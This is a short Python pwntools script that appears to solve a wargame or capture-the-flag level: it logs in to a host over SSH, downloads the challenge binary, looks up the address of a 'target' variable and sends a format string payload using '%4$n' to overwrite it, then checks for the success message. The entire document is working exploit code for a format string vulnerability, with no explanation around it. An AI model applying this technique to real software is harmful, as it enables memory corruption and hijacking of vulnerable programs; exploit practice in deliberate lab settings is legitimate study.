from pwn import *
import os.path as op

s = ssh(host=args.HOST, user=args.USER, password=args.PASS, port=int(args.PORT))

lbin = op.join('/tmp', op.basename(args.BIN))
s.download_file(args.BIN, lbin)
e = ELF(lbin)
target_addr = e.symbols['target']
log.info('target_addr: %08x', target_addr)

target_value = 0x40
idx = 4  # buf ptr, size, stream, <pad>
payload = fit({0: p32(target_addr), target_value: '%' + str(idx) + '$n'})
with s.system(args.BIN) as p:
    p.sendline(payload)
    p.recvline()
    ret = p.recvline()
    assert ret == 'you have modified the target :)\n'
